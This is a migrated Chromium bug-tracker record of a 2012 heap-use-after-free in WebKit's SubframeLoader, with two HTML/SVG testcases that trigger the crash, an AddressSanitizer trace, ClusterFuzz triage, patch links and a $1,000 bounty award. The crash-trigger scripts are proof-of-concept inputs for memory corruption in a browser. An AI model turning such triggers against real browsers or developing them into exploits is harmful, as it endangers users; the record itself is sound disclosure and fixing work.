# Heap-use-after-free in WebCore::SubframeLoader::loadSubframe

| Field | Value |
|-------|-------|
| **Issue ID** | [40053114](https://issues.chromium.org/issues/40053114) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P1 |
| **Component** | Blink |
| **Reporter** | ax...@gmail.com |
| **Assignee** | in...@chromium.org |
| **Created** | 2012-01-28 |
| **Bounty** | $1,000.00 |

## Description

**VULNERABILITY DETAILS**  

Heap use after free happens when appending (i)frame to an element with attached event listener.

**VERSION**  

18.0.1018.0 (Developer Build 119055 Linux)  

Does not crash on 16.0.912.77 m, Win7 x64.

**REPRODUCTION CASE**

<script>
function go() {
q = document.getElementById('root').contentDocument;
setInterval( function x() {
a='window.scroll(0, 1)';
q.getElementById('g').addEventListener('load', function(){ eval(a); }, 1)
a='document.open()';
q.getElementById('d').setAttribute('DOMCharacterDataModified', a);
q.getElementById('g').appendChild( document.createElement('frame') );
}, 1);
}
</script>

<object data="t.svg" id="root" onload="go()"/></object>

--- t.svg ---  

<svg>  

<d id="d"></d>  

<g id="g"></g>  

</svg>

**FOR CRASHES, PLEASE INCLUDE THE FOLLOWING ADDITIONAL INFORMATION**  

==9634== ERROR: AddressSanitizer heap-use-after-free on address 0x7f2ef8913448 at pc 0x7f2f09b5b90e bp 0x7fff29b1d2b0 sp 0x7fff29b1d2a8  

READ of size 8 at 0x7f2ef8913448 thread T0  

#0 0x7f2f09b5b90e in WebCore::Node::renderer() const /media/Chromium/chromium/depot\_tools/src/third\_party/WebKit/Source/WebCore/dom/Node.h:473  

#1 0x7f2f09b57cba in WebCore::SubframeLoader::loadOrRedirectSubframe(WebCore::HTMLFrameOwnerElement\*, WebCore::KURL const&, WTF::AtomicString const&, bool, bool) /media/Chromium/chromium/depot\_tools/src/third\_party/WebKit/Source/WebCore/loader/SubframeLoader.cpp:241  

#2 0x7f2f09b579a2 in WebCore::SubframeLoader::requestFrame(WebCore::HTMLFrameOwnerElement\*, WTF::String const&, WTF::AtomicString const&, bool, bool) /media/Chromium/chromium/depot\_tools/src/third\_party/WebKit/Source/WebCore/loader/SubframeLoader.cpp:84  

#3 0x7f2f09044df2 in WebCore::HTMLFrameOwnerElement::contentFrame() const /media/Chromium/chromium/depot\_tools/src/third\_party/WebKit/Source/WebCore/html/HTMLFrameOwnerElement.h:41  

#4 0x7f2f08e42409 in WebCore::notifyChildInserted(WebCore::Node\*) /media/Chromium/chromium/depot\_tools/src/third\_party/WebKit/Source/WebCore/dom/ContainerNode.cpp:1102  

#5 0x7f2f08e40c7a in WebCore::ContainerNode::appendChild(WTF::PassRefPtr[WebCore::Node](javascript:void(0);), int&, bool) /media/Chromium/chromium/depot\_tools/src/third\_party/WebKit/Source/WebCore/dom/ContainerNode.cpp:667  

#6 0x7f2f08efa83b in WebCore::Node::appendChild(WTF::PassRefPtr[WebCore::Node](javascript:void(0);), int&, bool) /media/Chromium/chromium/depot\_tools/src/third\_party/WebKit/Source/WebCore/dom/Node.cpp:669  

#7 0x7f2f095f852b in WebCore::V8Node::appendChildCallback(v8::Arguments const&) /media/Chromium/chromium/depot\_tools/src/third\_party/WebKit/Source/WebCore/bindings/v8/custom/V8NodeCustom.cpp:124  

#8 0x7f2f07d9a5a3 in HandleApiCallHelper /media/Chromium/chromium/depot\_tools/src/v8/src/builtins.cc:1220  

#9 0x7f2ed550420e  

#10 0x7f2ed5529fc8  

#11 0x7f2ed551fba7  

#12 0x7f2ed5507497  

#13 0x7f2f07de42e8 in v8::internal::Invoke(bool, v8::internal::Handle[v8::internal::JSFunction](javascript:void(0);), v8::internal::Handle[v8::internal::Object](javascript:void(0);), int, v8::internal::Handle[v8::internal::Object](javascript:void(0);)\*, bool\*) /media/Chromium/chromium/depot\_tools/src/v8/src/execution.cc:118  

#14 0x7f2f07d4d1a2 in v8::Function::Call(v8::Handle[v8::Object](javascript:void(0);), int, v8::Handle[v8::Value](javascript:void(0);)\*) /media/Chromium/chromium/depot\_tools/src/v8/src/api.cc:3601  

#15 0x7f2f095cd38e in WebCore::V8Proxy::instrumentedCallFunction(WebCore::Page\*, v8::Handle[v8::Function](javascript:void(0);), v8::Handle[v8::Object](javascript:void(0);), int, v8::Handle[v8::Value](javascript:void(0);)\*) /media/Chromium/chromium/depot\_tools/src/third\_party/WebKit/Source/WebCore/bindings/v8/V8Proxy.cpp:432  

#16 0x7f2f095ccdfb in WebCore::V8Proxy::callFunction(v8::Handle[v8::Function](javascript:void(0);), v8::Handle[v8::Object](javascript:void(0);), int, v8::Handle[v8::Value](javascript:void(0);)\*) /media/Chromium/chromium/depot\_tools/src/third\_party/WebKit/Source/WebCore/bindings/v8/V8Proxy.cpp:407  

#17 0x7f2f09d994a6 in WebCore::ScheduledAction::execute(WebCore::V8Proxy\*) /media/Chromium/chromium/depot\_tools/src/third\_party/WebKit/Source/WebCore/bindings/v8/ScheduledAction.cpp:131  

#18 0x7f2f09bcf14b in WebCore::InspectorInstrumentation::hasFrontends() /media/Chromium/chromium/depot\_tools/src/third\_party/WebKit/Source/WebCore/inspector/InspectorInstrumentation.h:217  

#19 0x7f2f092f1c28 in WebCore::ThreadTimers::sharedTimerFiredInternal() /media/Chromium/chromium/depot\_tools/src/third\_party/WebKit/Source/WebCore/platform/ThreadTimers.cpp:118  

#20 0x7f2f070766d6 in base::Callback<void ()()>::Run() const /media/Chromium/chromium/depot\_tools/src/./base/callback.h:272  

#21 0x7f2f07076f38 in MessageLoop::DeferOrRunPendingTask(base::PendingTask const&) /media/Chromium/chromium/depot\_tools/src/base/message\_loop.cc:470  

#22 0x7f2f07078229 in MessageLoop::DoWork() /media/Chromium/chromium/depot\_tools/src/base/message\_loop.cc:660  

BFD: Dwarf Error: Offset (1848602733) greater than or equal to .debug\_str size (79815959).  

BFD: Dwarf Error: Offset (1949237248) greater than or equal to .debug\_line size (54689463).  

BFD: Dwarf Error: Offset (1848602733) greater than or equal to .debug\_str size (79815959).  

BFD: Dwarf Error: Offset (1949237248) greater than or equal to .debug\_line size (54689463).  

BFD: Dwarf Error: Offset (1949266029) greater than or equal to .debug\_str size (79815959).  

BFD: Dwarf Error: Offset (1949237248) greater than or equal to .debug\_line size (54689463).  

BFD: Dwarf Error: Offset (1848602733) greater than or equal to .debug\_str size (79815959).  

BFD: Dwarf Error: Offset (1949237248) greater than or equal to .debug\_line size (54689463).  

BFD: Dwarf Error: Offset (1848602733) greater than or equal to .debug\_str size (79815959).  

BFD: Dwarf Error: Offset (1949237248) greater than or equal to .debug\_line size (54689463).  

#23 0x7f2f07082d37 in base::MessagePumpDefault::Run(base::MessagePump::Delegate\*) /media/Chromium/chromium/depot\_tools/src/base/message\_pump\_default.cc:28  

#24 0x7f2f0707526e in MessageLoop::RunInternal() /media/Chromium/chromium/depot\_tools/src/base/message\_loop.cc:418  

#25 0x7f2f0707345f in ~AutoRunState /media/Chromium/chromium/depot\_tools/src/base/message\_loop.cc:745  

#26 0x7f2f0bd87cbe in RendererMain(content::MainFunctionParams const&) /media/Chromium/chromium/depot\_tools/src/content/renderer/renderer\_main.cc:241  

#27 0x7f2f06fcf008 in RunZygote /media/Chromium/chromium/depot\_tools/src/content/app/content\_main.cc:233  

#28 0x7f2f06fce462 in content::ContentMain(int, char const\*\*, content::ContentMainDelegate\*) /media/Chromium/chromium/depot\_tools/src/content/app/content\_main.cc:455  

#29 0x7f2f0573cf57 in ChromeMain /media/Chromium/chromium/depot\_tools/src/chrome/app/chrome\_main.cc:32  

#30 0x7f2f0573ce5b in main /media/Chromium/chromium/depot\_tools/src/chrome/app/chrome\_exe\_main\_gtk.cc:18  

#31 0x7f2efeb7fd8e in \_\_libc\_start\_main /build/buildd/eglibc-2.12.1/csu/libc-start.c:258  

0x7f2ef8913448 is located 968 bytes inside of 2584-byte region [0x7f2ef8913080,0x7f2ef8913a98)  

freed by thread T0 here:  

#0 0x7f2f0cf08f52 in free ??:0  

#1 0x7f2f09c399aa in ~OwnPtr /media/Chromium/chromium/depot\_tools/src/third\_party/WebKit/Source/JavaScriptCore/wtf/OwnPtr.h:55  

#2 0x7f2f09c3913e in WTF::RefCounted[WebCore::Widget](javascript:void(0);)::operator delete(void\*) /media/Chromium/chromium/depot\_tools/src/third\_party/WebKit/Source/JavaScriptCore/wtf/RefCounted.h:178  

#3 0x7f2f08fceecf in ~RefPtr /media/Chromium/chromium/depot\_tools/src/third\_party/WebKit/Source/JavaScriptCore/wtf/RefPtr.h:58  

#4 0x7f2f08fc7e4c in WebCore::EventDispatcher::dispatchEvent(WebCore::Node\*, WTF::PassRefPtr[WebCore::EventDispatchMediator](javascript:void(0);)) /media/Chromium/chromium/depot\_tools/src/third\_party/WebKit/Source/WebCore/dom/EventDispatcher.cpp:56  

#5 0x7f2f08f12f37 in WebCore::Node::dispatchEvent(WTF::PassRefPtr[WebCore::Event](javascript:void(0);)) /media/Chromium/chromium/depot\_tools/src/third\_party/WebKit/Source/WebCore/dom/Node.cpp:2817  

#6 0x7f2f09be2d4e in WebCore::DOMWindow::dispatchLoadEvent() /media/Chromium/chromium/depot\_tools/src/third\_party/WebKit/Source/WebCore/page/DOMWindow.cpp:1606  

#7 0x7f2f08e6807e in WebCore::Document::dispatchWindowLoadEvent() /media/Chromium/chromium/depot\_tools/src/third\_party/WebKit/Source/WebCore/dom/Document.cpp:3696  

#8 0x7f2f09af1f46 in WebCore::FrameLoader::checkCompleted() /media/Chromium/chromium/depot\_tools/src/third\_party/WebKit/Source/WebCore/loader/FrameLoader.cpp:794  

#9 0x7f2f09aee808 in WebCore::FrameLoader::finishedParsing() /media/Chromium/chromium/depot\_tools/src/third\_party/WebKit/Source/WebCore/loader/FrameLoader.cpp:678  

#10 0x7f2f08e870fa in WebCore::Frame::page() const /media/Chromium/chromium/depot\_tools/src/third\_party/WebKit/Source/WebCore/page/Frame.h:345  

#11 0x7f2f09199ff3 in WebCore::HTMLDocumentParser::prepareToStopParsing() /media/Chromium/chromium/depot\_tools/src/third\_party/WebKit/Source/WebCore/html/parser/HTMLDocumentParser.cpp:381  

#12 0x7f2f09ad3bf4 in WebCore::DocumentWriter::endIfNotLoadingMainResource() /media/Chromium/chromium/depot\_tools/src/third\_party/WebKit/Source/WebCore/loader/DocumentWriter.cpp:233  

#13 0x7f2f09b0afd9 in WebCore::ResourceErrorBase::isNull() const /media/Chromium/chromium/depot\_tools/src/third\_party/WebKit/Source/WebCore/platform/network/ResourceErrorBase.h:42  

#14 0x7f2f09b31cd1 in WebCore::MainResourceLoader::didFinishLoading(double) /media/Chromium/chromium/depot\_tools/src/third\_party/WebKit/Source/WebCore/loader/MainResourceLoader.cpp:485  

#15 0x7f2f09b3042f in WebCore::MainResourceLoader::continueAfterContentPolicy(WebCore::PolicyAction, WebCore::ResourceResponse const&) /media/Chromium/chromium/depot\_tools/src/third\_party/WebKit/Source/WebCore/loader/MainResourceLoader.cpp:324  

#16 0x7f2f09b30abe in WebCore::MainResourceLoader::continueAfterContentPolicy(WebCore::PolicyAction) /media/Chromium/chromium/depot\_tools/src/third\_party/WebKit/Source/WebCore/loader/MainResourceLoader.cpp:339  

#17 0x7f2f09b44207 in WebCore::PolicyChecker::continueAfterContentPolicy(WebCore::PolicyAction) /media/Chromium/chromium/depot\_tools/src/third\_party/WebKit/Source/WebCore/loader/PolicyChecker.cpp:195  

#18 0x7f2f0893e757 in WebKit::FrameLoaderClientImpl::dispatchDecidePolicyForResponse(void (WebCore::PolicyChecker::\*)(WebCore::PolicyAction), WebCore::ResourceResponse const&, WebCore::ResourceRequest const&) /media/Chromium/chromium/depot\_tools/src/third\_party/WebKit/Source/WebKit/chromium/src/FrameLoaderClientImpl.cpp:927  

#19 0x7f2f09b31545 in WebCore::MainResourceLoader::didReceiveResponse(WebCore::ResourceResponse const&) /media/Chromium/chromium/depot\_tools/src/third\_party/WebKit/Source/WebCore/loader/MainResourceLoader.cpp:431  

#20 0x7f2f09b3272f in ~ResourceResponse /media/Chromium/chromium/depot\_tools/src/third\_party/WebKit/Source/WebCore/platform/network/chromium/ResourceResponse.h:37  

#21 0x7f2f09b33019 in WebCore::MainResourceLoader::loadNow(WebCore::ResourceRequest&) /media/Chromium/chromium/depot\_tools/src/third\_party/WebKit/Source/WebCore/loader/MainResourceLoader.cpp:580  

#22 0x7f2f09b336c2 in WebCore::MainResourceLoader::load(WebCore::ResourceRequest const&, WebCore::SubstituteData const&) /media/Chromium/chromium/depot\_tools/src/third\_party/WebKit/Source/WebCore/loader/MainResourceLoader.cpp:613  

#23 0x7f2f09ac3d1f in WebCore::DocumentLoader::startLoadingMainResource(unsigned long) /media/Chromium/chromium/depot\_tools/src/third\_party/WebKit/Source/WebCore/loader/DocumentLoader.cpp:824  

#24 0x7f2f09b0c387 in WebCore::FrameLoader::continueLoadAfterWillSubmitForm() /media/Chromium/chromium/depot\_tools/src/third\_party/WebKit/Source/WebCore/loader/FrameLoader.cpp:2328  

#25 0x7f2f09b01e04 in WebCore::FrameLoader::continueLoadAfterNavigationPolicy(WebCore::ResourceRequest const&, WTF::PassRefPtr[WebCore::FormState](javascript:void(0);), bool) /media/Chromium/chromium/depot\_tools/src/third\_party/WebKit/Source/WebCore/loader/FrameLoader.cpp:2908  

#26 0x7f2f09b02132 in ~PassRefPtr /media/Chromium/chromium/depot\_tools/src/third\_party/WebKit/Source/JavaScriptCore/wtf/PassRefPtr.h:67  

#27 0x7f2f09b40d1d in WebCore::PolicyCallback::call(bool) /media/Chromium/chromium/depot\_tools/src/third\_party/WebKit/Source/WebCore/loader/PolicyCallback.cpp:103  

#28 0x7f2f09b43673 in WebCore::PolicyChecker::continueAfterNavigationPolicy(WebCore::PolicyAction) /media/Chromium/chromium/depot\_tools/src/third\_party/WebKit/Source/WebCore/loader/PolicyChecker.cpp:168  

#29 0x7f2f0893f69a in WebKit::FrameLoaderClientImpl::dispatchDecidePolicyForNavigationAction(void (WebCore::PolicyChecker::\*)(WebCore::PolicyAction), WebCore::NavigationAction const&, WebCore::ResourceRequest const&, WTF::PassRefPtr[WebCore::FormState](javascript:void(0);)) /media/Chromium/chromium/depot\_tools/src/third\_party/WebKit/Source/WebKit/chromium/src/FrameLoaderClientImpl.cpp:1012  

previously allocated by thread T0 here:  

#0 0x7f2f0cf09012 in malloc ??:0  

#1 0x7f2f089c2d3b in WTF::fastMalloc(unsigned long) /media/Chromium/chromium/depot\_tools/src/third\_party/WebKit/Source/JavaScriptCore/wtf/FastMalloc.cpp:268  

#2 0x7f2f09c2b315 in WTF::RefCounted[WebCore::Frame](javascript:void(0);)::operator new(unsigned long) /media/Chromium/chromium/depot\_tools/src/third\_party/WebKit/Source/JavaScriptCore/wtf/RefCounted.h:178  

#3 0x7f2f088ac73e in WTF::PassRefPtr[WebCore::Frame](javascript:void(0);)::leakRef() const /media/Chromium/chromium/depot\_tools/src/third\_party/WebKit/Source/JavaScriptCore/wtf/PassRefPtr.h:161  

#4 0x7f2f08943ff1 in ~FrameLoadRequest /media/Chromium/chromium/depot\_tools/src/third\_party/WebKit/Source/WebCore/loader/FrameLoadRequest.h:34  

#5 0x7f2f09b5b439 in WTF::PassRefPtr[WebCore::Frame](javascript:void(0);)::leakRef() const /media/Chromium/chromium/depot\_tools/src/third\_party/WebKit/Source/JavaScriptCore/wtf/PassRefPtr.h:161  

#6 0x7f2f09b57cba in WebCore::SubframeLoader::loadOrRedirectSubframe(WebCore::HTMLFrameOwnerElement\*, WebCore::KURL const&, WTF::AtomicString const&, bool, bool) /media/Chromium/chromium/depot\_tools/src/third\_party/WebKit/Source/WebCore/loader/SubframeLoader.cpp:241  

#7 0x7f2f09b5986e in WebCore::SubframeLoader::requestObject(WebCore::HTMLPlugInImageElement\*, WTF::String const&, WTF::AtomicString const&, WTF::String const&, WTF::Vector<WTF::String, 0ul> const&, WTF::Vector<WTF::String, 0ul> const&) /media/Chromium/chromium/depot\_tools/src/third\_party/WebKit/Source/WebCore/loader/SubframeLoader.cpp:148  

#8 0x7f2f090a0858 in WebCore::HTMLObjectElement::updateWidget(WebCore::PluginCreationOption) /media/Chromium/chromium/depot\_tools/src/third\_party/WebKit/Source/WebCore/html/HTMLObjectElement.cpp:306  

#9 0x7f2f08e473a4 in WebCore::TreeShared[WebCore::ContainerNode](javascript:void(0);)::deref() /media/Chromium/chromium/depot\_tools/src/third\_party/WebKit/Source/WebCore/platform/TreeShared.h:75  

#10 0x7f2f08e4714b in WebCore::ContainerNode::resumePostAttachCallbacks() /media/Chromium/chromium/depot\_tools/src/third\_party/WebKit/Source/WebCore/dom/ContainerNode.cpp:732  

#11 0x7f2f08e6700f in WebCore::Document::recalcStyle(WebCore::Node::StyleChange) /media/Chromium/chromium/depot\_tools/src/third\_party/WebKit/Source/WebCore/dom/Document.cpp:1611  

#12 0x7f2f08e68a5b in WebCore::Document::updateStyleIfNeeded() /media/Chromium/chromium/depot\_tools/src/third\_party/WebKit/Source/WebCore/dom/Document.cpp:1630  

#13 0x7f2f092f1c28 in WebCore::ThreadTimers::sharedTimerFiredInternal() /media/Chromium/chromium/depot\_tools/src/third\_party/WebKit/Source/WebCore/platform/ThreadTimers.cpp:118  

#14 0x7f2f070766d6 in base::Callback<void ()()>::Run() const /media/Chromium/chromium/depot\_tools/src/./base/callback.h:272  

#15 0x7f2f07076f38 in MessageLoop::DeferOrRunPendingTask(base::PendingTask const&) /media/Chromium/chromium/depot\_tools/src/base/message\_loop.cc:470  

#16 0x7f2f07078229 in MessageLoop::DoWork() /media/Chromium/chromium/depot\_tools/src/base/message\_loop.cc:660  

#17 0x7f2f07082d37 in base::MessagePumpDefault::Run(base::MessagePump::Delegate\*) /media/Chromium/chromium/depot\_tools/src/base/message\_pump\_default.cc:28  

#18 0x7f2f0707526e in MessageLoop::RunInternal() /media/Chromium/chromium/depot\_tools/src/base/message\_loop.cc:418  

#19 0x7f2f0707345f in ~AutoRunState /media/Chromium/chromium/depot\_tools/src/base/message\_loop.cc:745  

#20 0x7f2f0bd87cbe in RendererMain(content::MainFunctionParams const&) /media/Chromium/chromium/depot\_tools/src/content/renderer/renderer\_main.cc:241  

#21 0x7f2f06fcf008 in RunZygote /media/Chromium/chromium/depot\_tools/src/content/app/content\_main.cc:233  

#22 0x7f2f06fce462 in content::ContentMain(int, char const\*\*, content::ContentMainDelegate\*) /media/Chromium/chromium/depot\_tools/src/content/app/content\_main.cc:455  

==9634== ABORTING  

Stats: 37M malloced (31M for red zones) by 75601 calls  

Stats: 1M realloced by 1956 calls  

Stats: 33M freed by 63667 calls  

Stats: 0M really freed by 0 calls  

Stats: 92M (23566 full pages) mmaped in 23 calls  

mmaps by size class: 8:65532; 9:16382; 10:8190; 11:2047; 12:1024; 13:1536; 14:256; 15:256; 16:64; 17:64; 18:16; 21:6;  

mallocs by size class: 8:58608; 9:8586; 10:5031; 11:1396; 12:387; 13:1126; 14:147; 15:228; 16:24; 17:48; 18:14; 21:6;  

frees by size class: 8:48032; 9:7961; 10:4733; 11:1122; 12:304; 13:1100; 14:122; 15:222; 16:17; 17:34; 18:14; 21:6;  

rfrees by size class:  

Stats: malloc large: 68 small slow: 393  

Shadow byte and word:  

0x1fe5df122689: fd  

0x1fe5df122688: fd fd fd fd fd fd fd fd  

More shadow bytes:  

0x1fe5df122668: fd fd fd fd fd fd fd fd  

0x1fe5df122670: fd fd fd fd fd fd fd fd  

0x1fe5df122678: fd fd fd fd fd fd fd fd  

0x1fe5df122680: fd fd fd fd fd fd fd fd  

=>0x1fe5df122688: fd fd fd fd fd fd fd fd  

0x1fe5df122690: fd fd fd fd fd fd fd fd  

0x1fe5df122698: fd fd fd fd fd fd fd fd  

0x1fe5df1226a0: fd fd fd fd fd fd fd fd  

0x1fe5df1226a8: fd fd fd fd fd fd fd fd

## Attachments

- [fix](attachments/fix) (text/x-diff; charset=us-ascii, 511 B)

## Timeline

### pa...@chromium.org (2012-01-29)

I can't get it to repro on 17 beta on Mac. I'll try ToT on Monday. I've submitted a ClusterFuzz test too, so we'll see what that says. I expect that it'll end up being OS-All if we can repro it; this doesn't seem like an OS-specific crash.

### pa...@chromium.org (2012-01-29)

ClusterFuzz repros it. Details coming...

### in...@chromium.org (2012-01-30)

Ax330d, this is not a reliable repro to reproduce this bug (probably because of setInterval, etc). Can you please provide a better repro, that will increase your chances for a higher reward.

### in...@chromium.org (2012-01-30)

Marty, can you try to fix the testcase and reupload to clusterfuzz. Looks like window.scroll and setinterval might be causing the flakiness.

### ax...@gmail.com (2012-01-30)

@inferno, ok, will try. 

### ax...@gmail.com (2012-01-30)

[Comment Deleted]

### ax...@gmail.com (2012-01-30)

Bit cleaner repro, but can't make it work without setInterval():
<script>
    function go() {
        q = document.getElementById('root').contentDocument;
        q.addEventListener('load', function(){ eval('document.open()'); }, 1);
        setInterval( function xx() {
            q.getElementById('g').appendChild( document.createElement('iframe') );
        } , 1);
    }
</script>
<object data="t.svg" id="root" onload="go()"/></object>

--- t.svg ---
<svg><g id="g"></g></svg>

### mb...@chromium.org (2012-01-30)

Detailed report: https://cluster-fuzz.appspot.com/testcase?key=16841725

Uploader: mbarbella@google.com

Crash Type: Heap-use-after-free READ 8
Crash Address: 0x7f3ae8e24448
Crash State:
  - crash stack -
  WebCore::SubframeLoader::loadSubframe
  WebCore::SubframeLoader::loadOrRedirectSubframe
  - free stack -
  WebCore::FrameView::~FrameView
  WebCore::FrameView::~FrameView
  

Minimized Testcase (0.46 Kb): https://cluster-fuzz.appspot.com/download/AMIfv96T7kzgLRJuErkENNyUlH0xvjqIGN4hlpADE2YUd9ML3RNNY58mB_xeSTXIAIx3w0C6upwF1IBuONta5gnuRzo8IZzD4fJWHY3JnOPrIMpzK7HKRjrsZWsEHArd-Vp4yr0R1-_AlCDRMEEHSn-UigOdMl2rsA

### pa...@chromium.org (2012-01-30)

Upstreamed: https://bugs.webkit.org/show_bug.cgi?id=77345

### in...@chromium.org (2012-01-30)

Smart move Marty, using DRT and modifying the repro for consistent crash.

### in...@chromium.org (2012-02-03)

attaching patch using my left, someone needs to help through review, layouttest.



### in...@chromium.org (2012-02-04)

subframe creation causes event dispatch blowing away main frame. patch above needs review help.

### js...@chromium.org (2012-02-05)

Nate, could you take a quick look at the bug and patch attached above? Abhishek is out of the office from surgery on his dominant hand. So, iterating isn't easy for him right now and someone else may have to finish the patch off and land it.

### in...@chromium.org (2012-02-06)

Nate, just a fyi, point of free is creation of subframe here - http://code.google.com/codesearch#OAMlx_jo-ck/src/third_party/WebKit/Source/WebCore/loader/SubframeLoader.cpp&exact_package=chromium&q=SubframeLoader::loadSubframe&l=266 and point of crash/access is http://code.google.com/codesearch#OAMlx_jo-ck/src/third_party/WebKit/Source/WebCore/loader/SubframeLoader.cpp&exact_package=chromium&q=SubframeLoader::loadSubframe&l=269

### in...@chromium.org (2012-02-06)

just thought of uploading simple patch myself and did :)

### in...@chromium.org (2012-02-06)

http://trac.webkit.org/changeset/106818

### sc...@gmail.com (2012-02-07)

[Empty comment from Monorail migration]

### sc...@gmail.com (2012-02-08)

@Ax330d: thanks for helping with a cleaner test case! Definitely a $1000 reward.

----
Boilerplate text:
Please do NOT publicly disclose details until a fix has been released to all our
users. Early public disclosure may cancel the provisional reward.
Also, please be considerate about disclosure when the bug affects a core library
that may be used by other products.
Please do NOT share this information with third parties who are not directly
involved in fixing the bug. Doing so may cancel the provisional reward.
Please be honest if you have already disclosed anything publicly or to third parties.
----

### sc...@gmail.com (2012-02-10)

M18: http://trac.webkit.org/changeset/107315
M17: http://trac.webkit.org/changeset/107316

### sc...@gmail.com (2012-02-11)

[Empty comment from Monorail migration]

### sc...@gmail.com (2012-03-21)

[Empty comment from Monorail migration]

### [Deleted User] (2012-05-15)

Marking old security bugs Fixed..

### bu...@chromium.org (2012-10-13)

This issue has been closed for some time. No one will pay attention to new comments.
If you are seeing this bug or have new data, please click New Issue to start a new bug.

### bu...@chromium.org (2013-03-10)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-13)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-13)

[Empty comment from Monorail migration]

### sc...@gmail.com (2013-03-21)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-21)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-21)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-21)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-04-01)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-04-06)

[Empty comment from Monorail migration]

### sh...@chromium.org (2016-06-14)

[Empty comment from Monorail migration]

### sh...@chromium.org (2016-10-01)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### sh...@chromium.org (2016-10-02)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### mb...@chromium.org (2016-10-02)

[Empty comment from Monorail migration]

### aw...@chromium.org (2018-04-25)

[Empty comment from Monorail migration]

### is...@google.com (2018-04-25)

This issue was migrated from crbug.com/chromium/111779?no_tracker_redirect=1

[Monorail components added to Component Tags custom field.]

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40053114)*
